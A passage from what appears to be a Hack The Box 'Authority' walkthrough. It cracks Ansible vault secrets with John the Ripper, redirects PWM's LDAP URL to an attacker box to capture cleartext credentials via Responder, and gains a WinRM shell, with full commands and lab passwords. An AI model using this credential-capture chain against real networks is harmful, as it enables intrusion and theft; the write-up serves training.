+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">6134353663663462373265633832356663356239383039640a346431373431666433343434366139</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">35653634376333666234613466396534343030656165396464323564373334616262613439343033</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">6334326263326364380a653034313733326639323433626130343834663538326439636232306531</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">3438</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">pwm_admin_password</span><span class="p">:</span><span class="w"> </span>!<span class="l">vault |</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">$ANSIBLE_VAULT;1.1;AES256</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">31356338343963323063373435363261323563393235633365356134616261666433393263373736</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">3335616263326464633832376261306131303337653964350a363663623132353136346631396662</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">38656432323830393339336231373637303535613636646561653637386634613862316638353530</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">3930356637306461350a316466663037303037653761323565343338653934646533663365363035</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">6531</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">ldap_uri</span><span class="p">:</span><span class="w"> </span><span class="l">ldap://127.0.0.1/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">ldap_base_dn</span><span class="p">:</span><span class="w"> </span><span class="s2">&#34;DC=authority,DC=htb&#34;</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="nt">ldap_admin_password</span><span class="p">:</span><span class="w"> </span>!<span class="l">vault |</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">$ANSIBLE_VAULT;1.1;AES256</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">63303831303534303266356462373731393561313363313038376166336536666232626461653630</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">3437333035366235613437373733316635313530326639330a643034623530623439616136363563</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">34646237336164356438383034623462323531316333623135383134656263663266653938333334</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="l">3238343230333633350a646664396565633037333431626163306531336336326665316430613566</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">          </span><span class="m">3764</span><span class="w">
+</span></span></span></code></pre></div><p>I can crack the encrypted variables by generating a hash with the <code>ansible2john</code> script and then crack it using JohnTheRipper.</p>
+<blockquote>
+<p>The script requires that the hash start with <code>$ANSIBLE_VAULT</code>. So I saved one of the variables in a <code>variable.yml</code> file</p>
+</blockquote>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ansible2john variable.yml
+</span></span><span class="line"><span class="cl">admin_login.yml:<span class="nv">$ansible$0</span>*0*2fe48d56e7e16f71c18abd22085f39f4fb11a2b9a456cf4b72ec825fc5b9809d*e041732f9243ba0484f582d9cb20e148*4d1741fd34446a95e647c3fb4a4f9e4400eae9dd25d734abba49403c42bc2cd8
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ ansible2john variable.yml &gt; vault_hash
+</span></span></code></pre></div><p>Cracking the generated hash using JTR, gives the decryption password for the vault, <code>!@#$%^&amp;*</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ john vault_hash  --wordlist<span class="o">=</span>~/wordlists/rockyou.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>ansible, Ansible Vault <span class="o">[</span>PBKDF2-SHA256 HMAC-256 128/128 AVX 4x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">10000</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">4</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">!@#$%^<span class="p">&amp;</span>*         <span class="o">(</span>variable.yml<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:28 DONE <span class="o">(</span>2023-08-05 02:30<span class="o">)</span> 0.03567g/s 1420p/s 1420c/s 1420C/s 001983..victor2
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></div><p>With the password the variables can be decrypted the variables using <code>ansible-vault decrypt</code> command.</p>
+<ul>
+<li>pwm_admin_login → <code>svc_pwm</code></li>
+<li>pwm_admin_password → <code>pWm_@dm!N_!23</code></li>
+<li>ldap_admin_password → <code>DevT3st@123</code></li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ ansible-vault decrypt pwm_login.yml
+</span></span><span class="line"><span class="cl">Vault password:
+</span></span><span class="line"><span class="cl">Decryption successful
+</span></span><span class="line"><span class="cl">❯ cat pwm_login.yml
+</span></span><span class="line"><span class="cl">svc_pwm
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ ansible-vault decrypt pwm_password.yml
+</span></span><span class="line"><span class="cl">Vault password:
+</span></span><span class="line"><span class="cl">Decryption successful
+</span></span><span class="line"><span class="cl">❯ cat pwm_password.yml
+</span></span><span class="line"><span class="cl">pWm_@dm!N_!23
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ ansible-vault decrypt ldap_password.yml
+</span></span><span class="line"><span class="cl">Vault password:
+</span></span><span class="line"><span class="cl">Decryption successful
+</span></span><span class="line"><span class="cl">❯ cat ldap_password.yml
+</span></span><span class="line"><span class="cl">DevT3st@123
+</span></span></code></pre></div><h3 id="port-8443---https" class="relative group">port 8443 - HTTPS <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#port-8443---https" aria-label="Anchor">#</a></span></h3><p>Based on the headers, it appears the site is loading the contents of the <code>/pwm</code> directory.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ https --verify <span class="nb">false</span> authority.htb:8443
+</span></span><span class="line"><span class="cl">HTTP/1.1 <span class="m">200</span>
+</span></span><span class="line"><span class="cl">Connection: keep-alive
+</span></span><span class="line"><span class="cl">Content-Length: <span class="m">82</span>
+</span></span><span class="line"><span class="cl">Content-Type: text/html<span class="p">;</span><span class="nv">charset</span><span class="o">=</span>ISO-8859-1
+</span></span><span class="line"><span class="cl">Date: Sat, <span class="m">05</span> Aug <span class="m">2023</span> 21:24:16 GMT
+</span></span><span class="line"><span class="cl">Keep-Alive: <span class="nv">timeout</span><span class="o">=</span><span class="m">60</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">&lt;html&gt;&lt;head&gt;&lt;meta http-equiv<span class="o">=</span><span class="s2">&#34;refresh&#34;</span> <span class="nv">content</span><span class="o">=</span><span class="s2">&#34;0;URL=&#39;/pwm&#39;&#34;</span>/&gt;&lt;/head&gt;&lt;/html&gt;
+</span></span></code></pre></div><p>The index page pops up a notice stating that PWM is in configuration mode, allowing me to make updates to the config w/o LDAP authentication.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/PWM-config-mode-notice.png" alt="PWM-config-mode-notice" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">PWM Notice</figcaption>
+</figure>
+</p>
+<p>Attempting to authenticate using the admin credentials for PWM, decrypted from the ansible-vault, results in a &ldquo;5017 Directory unavailable&rdquo; error.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/PWM-login-error.png" alt="PWM-login-error" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">PWN Login error</figcaption>
+</figure>
+</p>
+<hr>
+<h2 id="initial-foothold" class="relative group">Initial Foothold <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#initial-foothold" aria-label="Anchor">#</a></span></h2><hr>
+<h3 id="capturing-ldap-credentials" class="relative group">Capturing LDAP credentials <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#capturing-ldap-credentials" aria-label="Anchor">#</a></span></h3><p>The login page also links to a configuration manager at <code>private/config/login</code>. This is intriguing, considering the notice earlier regarding configuration modifications.</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/PWM-configuration-manager.png" alt="PWM-configuration-manager" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Configuration Manager Login</figcaption>
+</figure>
+</p>
+<p>Luckily, the pwm_admin_password credential from the ansible vault works here. Post login I can see the absolute path to the configuration file. It also has an option to import and export the configurations. When attempting to download the config a warning is shown stating the file contains sensitive credentials.</p>
+<p>Fortunately, the <code>pwm_admin_password</code> obtained from the Ansible vault works here. Post login, I can see the absolute path to the configuration file, along with an option to &ldquo;Import&rdquo; and &ldquo;Export&rdquo; configurations</p>
+<p>
+
+
+
+
+
+
+  
+  
+<figure><img src="./images/PWM-config-manager-post-login.png" alt="PWM-config-manager-post-login" class="mx-auto my-0 rounded-md" /><figcaption class="text-center">Configuration Manager</figcaption>
+</figure>
+</p>
+<!-- ![PWM-config-summary](./images/PWM-config-summary.png) -->
+<p>The downloaded configuration file reveals</p>
+<ul>
+<li>LDAP proxy username: <code>svc_ldap</code>.</li>
+<li>LDAP proxy password, although it appears to be encrypted.</li>
+<li>LDAP server URL: <code>ldaps://authority.authority.htb:636</code>.</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;setting</span> <span class="na">key=</span><span class="s">&#34;ldap.proxy.username&#34;</span> <span class="na">modifyTime=</span><span class="s">&#34;2022-08-11T01:46:23Z&#34;</span> <span class="na">profile=</span><span class="s">&#34;default&#34;</span> <span class="na">syntax=</span><span class="s">&#34;STRING&#34;</span> <span class="na">syntaxVersion=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;label&gt;</span>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy User<span class="nt">&lt;/label&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;value&gt;</span>CN=svc_ldap,OU=Service Accounts,OU=CORP,DC=authority,DC=htb<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/setting&gt;</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;setting</span> <span class="na">key=</span><span class="s">&#34;ldap.proxy.password&#34;</span> <span class="na">modifyTime=</span><span class="s">&#34;2022-08-11T01:46:23Z&#34;</span> <span class="na">profile=</span><span class="s">&#34;default&#34;</span> <span class="na">syntax=</span><span class="s">&#34;PASSWORD&#34;</span> <span class="na">syntaxVersion=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;label&gt;</span>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP Proxy Password<span class="nt">&lt;/label&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;value&gt;</span>ENC-PW:SWHyEvLQo/B2gjYvXoL2OtcBIwVhfTW9spltsPbJeH/gQhfS+3/aIhmt29qR/LzkTYfsZfkLaNHbjGfbQldz5EW7BqPxGqzMz+bEfyPIvA8=<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/setting&gt;</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;setting</span> <span class="na">key=</span><span class="s">&#34;ldap.serverUrls&#34;</span> <span class="na">modifyTime=</span><span class="s">&#34;2022-08-11T01:46:23Z&#34;</span> <span class="na">profile=</span><span class="s">&#34;default&#34;</span> <span class="na">syntax=</span><span class="s">&#34;STRING_ARRAY&#34;</span> <span class="na">syntaxVersion=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;label&gt;</span>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs<span class="nt">&lt;/label&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;value&gt;</span>ldaps://authority.authority.htb:636<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/setting&gt;</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>With the ability to import configurations on the website, altering the LDAP server URL to my own (hosted using responder) might allow me to capture LDAP credentials when other services attempt to authenticate to LDAP.</p>
+<p>I modified the LDAP server URL to <code>ldap://&lt;tun0&gt;:IP</code>, redirecting it to my attack box.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-xml" data-lang="xml"><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;setting</span> <span class="na">key=</span><span class="s">&#34;ldap.serverUrls&#34;</span> <span class="na">modifyTime=</span><span class="s">&#34;2022-08-11T01:46:23Z&#34;</span> <span class="na">profile=</span><span class="s">&#34;default&#34;</span> <span class="na">syntax=</span><span class="s">&#34;STRING_ARRAY&#34;</span> <span class="na">syntaxVersion=</span><span class="s">&#34;0&#34;</span><span class="nt">&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;label&gt;</span>LDAP ⇨ LDAP Directories ⇨ default ⇨ Connection ⇨ LDAP URLs<span class="nt">&lt;/label&gt;</span>
+</span></span><span class="line"><span class="cl">    <span class="nt">&lt;value&gt;</span>ldap://10.10.14.132:389<span class="nt">&lt;/value&gt;</span>
+</span></span><span class="line"><span class="cl"><span class="nt">&lt;/setting&gt;</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span></code></pre></div><p>When I update the configuration and run Responder on my attack box, it successfully captures the cleartext LDAP credentials.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ _ responder -I tun0 -v
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">    LDAP server                <span class="o">[</span>ON<span class="o">]</span>
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl"><span class="o">[</span>+<span class="o">]</span> Listening <span class="k">for</span> events...
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Attempting to parse an old simple Bind request.
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Client   : 10.10.11.222
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Username : <span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb
+</span></span><span class="line"><span class="cl"><span class="o">[</span>LDAP<span class="o">]</span> Cleartext Password : lDaP_1n_th3_cle4r!
+</span></span></code></pre></div><p>This works even when starting a netcat listener on port 389 (ldap)</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nc -nlvp <span class="m">389</span>
+</span></span><span class="line"><span class="cl">listening on <span class="o">[</span>any<span class="o">]</span> <span class="m">389</span> ...
+</span></span><span class="line"><span class="cl">connect to <span class="o">[</span>10.10.14.132<span class="o">]</span> from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.11.222<span class="o">]</span> <span class="m">59434</span>
+</span></span><span class="line"><span class="cl">0Y<span class="sb">`</span>T<span class="p">;</span><span class="nv">CN</span><span class="o">=</span>svc_ldap,OU<span class="o">=</span>Service Accounts,OU<span class="o">=</span>CORP,DC<span class="o">=</span>authority,DC<span class="o">=</span>htb�lDaP_1n_th3_cle4r!
+</span></span></code></pre></div><h3 id="shell-as-svc_ldap" class="relative group">Shell as svc_ldap <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#shell-as-svc_ldap" aria-label="Anchor">#</a></span></h3><p>With these new credentials, I have read access to the <code>Department Shares</code> share. However, the shares only has empty directories in it.
+Using the newly acquired credentials, I have read access to the <code>Department Shares</code> share. However, after spidering, it seems the share only contains empty directories.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc smb  10.10.11.222 -u  <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span>
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
+</span></span><span class="line"><span class="cl">❯ nxc smb  10.10.11.222 -u  <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> --shares
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Enumerated shares
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        Share           Permissions     Remark
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        -----           -----------     ------
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        ADMIN$                          Remote Admin
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        C$                              Default share
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        Department Shares READ
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        Development     READ
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        IPC$            READ            Remote IPC
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        NETLOGON        READ            Logon server share
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        SYSVOL          READ            Logon server share
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ nxc smb  10.10.11.222 -u  <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span> -M spider_plus -o <span class="nv">DOWNLOAD_FLAG</span><span class="o">=</span><span class="nb">true</span>
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> x64 <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</span></span><span class="line"><span class="cl">SMB          10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r!
+</span></span><span class="line"><span class="cl">SPIDER_P...  10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Started module spidering_plus with the following options:
+</span></span><span class="line"><span class="cl">SPIDER_P...  10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>*<span class="o">]</span>  DOWNLOAD_FLAG: True
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">...snip...
+</span></span><span class="line"><span class="cl">SPIDER_P...  10.10.11.222   <span class="m">445</span>    AUTHORITY        <span class="o">[</span>+<span class="o">]</span> All files processed successfully.
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ /bin/cat /tmp/nxc_spider_plus/ 10.10.11.222.json <span class="p">|</span> jq -r <span class="s1">&#39;.&#34;Department Shares&#34;&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="o">{}</span>
+</span></span></code></pre></div><p>The obtained credentials also provide access over WinRM. I successfully logged in as <code>svc_ldap</code> using evil-winrm.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ nxc winrm  10.10.11.222 -u  <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span>
+</span></span><span class="line"><span class="cl">WINRM        10.10.11.222   <span class="m">5985</span>   AUTHORITY        <span class="o">[</span>*<span class="o">]</span> Windows 10.0 Build <span class="m">17763</span> <span class="o">(</span>name:AUTHORITY<span class="o">)</span> <span class="o">(</span>domain:authority.htb<span class="o">)</span>
+</span></span><span class="line"><span class="cl">WINRM        10.10.11.222   <span class="m">5985</span>   AUTHORITY        <span class="o">[</span>+<span class="o">]</span> authority.htb<span class="se">\s</span>vc_ldap:lDaP_1n_th3_cle4r! <span class="o">(</span>Pwn3d!<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">❯ evil-winrm -i 10.10.11.222 -u <span class="s1">&#39;svc_ldap&#39;</span> -p <span class="s1">&#39;lDaP_1n_th3_cle4r!&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Evil-WinRM shell v3.5
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Info: Establishing connection to remote endpoint
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt; whoami
+</span></span><span class="line"><span class="cl">htb<span class="se">\s</span>vc_ldap
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt;
+</span></span></code></pre></div><hr>
+<h2 id="enumerating-active-directory" class="relative group">Enumerating Active Directory <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#enumerating-active-directory" aria-label="Anchor">#</a></span></h2><hr>
+<p>In the <code>C:\</code> directory, there&rsquo;s a &ldquo;Certs&rdquo; directory containing a certificate named <code>LDAPs.pfx</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cmd" data-lang="cmd"><span class="line"><span class="cl">*Evil-WinRM* PS C:\<span class="p">&gt;</span> ls
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:\
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">d-----        4/23/2023   6:16 PM                Certs
+</span></span><span class="line"><span class="cl">d-----        3/28/2023   1:59 PM                Department Shares
+</span></span><span class="line"><span class="cl">d-----        3/17/2023   9:20 AM                Development
+</span></span><span class="line"><span class="cl">d-----         8/9/2022   7:00 PM                inetpub
+</span></span><span class="line"><span class="cl">d-----        3/24/2023   8:22 PM                PerfLogs
+</span></span><span class="line"><span class="cl">d-r---        3/25/2023   1:20 AM                Program Files
+</span></span><span class="line"><span class="cl">d-----        3/25/2023   1:19 AM                Program Files (x86)
+</span></span><span class="line"><span class="cl">d-----         8/5/2023   7:23 PM                pwm
+</span></span><span class="line"><span class="cl">d-r---        3/24/2023  11:27 PM                Users
+</span></span><span class="line"><span class="cl">d-----        7/12/2023   1:19 PM                Windows
+</span></span><span class="line"><span class="cl">-a----        8/10/2022   8:44 PM       84784749 pwm-onejar-2.0.3.jar
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">*Evil-WinRM* PS C:\<span class="p">&gt;</span> ls <span class="s2">&#34;C:/Certs/&#34;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    Directory: C:\Certs
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Mode                LastWriteTime         Length Name
+</span></span><span class="line"><span class="cl">----                -------------         ------ ----
+</span></span><span class="line"><span class="cl">-a----        4/23/2023   6:11 PM           4933 LDAPs.pfx
+</span></span></code></pre></div><p>The certificate is password protected. Nevertheless, its presence alone suggests the existence of Active Directory Certificate Services (AD CS).</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">❯ certipy cert -pfx LDAPs.pfx
+</span></span><span class="line"><span class="cl">Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Got error: Invalid password or PKCS12 data
+</span></span><span class="line"><span class="cl"><span class="o">[</span>-<span class="o">]</span> Use -debug to print a stacktrace
+</span></span></code></pre></div><p>A Certutil dump confirms the presence of a certificate authority named <code>AUTHORITY-CA</code> in the environment.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">*Evil-WinRM* PS C:<span class="se">\U</span>sers<span class="se">\s</span>vc_ldap<span class="se">\D</span>ocuments&gt; certutil -dump
+</span></span><span class="line"><span class="cl">Entry 0: <span class="o">(</span>Local<span class="o">)</span>
+</span></span><span class="line"><span class="cl">  Name:                         <span class="s2">&#34;AUTHORITY-CA&#34;</span>
+</span></span><span class="line"><span class="cl">  Organizational Unit:          <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  Organization:                 <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  Locality:                     <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  State:                        <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  Country/region:               <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  Config:                       <span class="s2">&#34;authority.authority.htb\AUTHORITY-CA&#34;</span>
+</span></span><span class="line"><span class="cl">  Exchange Certificate:         <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  Signature Certificate:        <span class="s2">&#34;authority.authority.htb_AUTHORITY-CA.crt&#34;</span>
+</span></span><span class="line"><span class="cl">  Description:                  <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  Server:                       <span class="s2">&#34;authority.authority.htb&#34;</span>
+</span></span><span class="line"><span class="cl">  Authority:                    <span class="s2">&#34;AUTHORITY-CA&#34;</span>
+</span></span><span class="line"><span class="cl">  Sanitized Name:               <span class="s2">&#34;AUTHORITY-CA&#34;</span>
+</span></span><span class="line"><span class="cl">  Short Name:                   <span class="s2">&#34;AUTHORITY-CA&#34;</span>
+</span></span><span class="line"><span class="cl">  Sanitized Short Name:         <span class="s2">&#34;AUTHORITY-CA&#34;</span>
+</span></span><span class="line"><span class="cl">  Flags:                        <span class="s2">&#34;13&#34;</span>
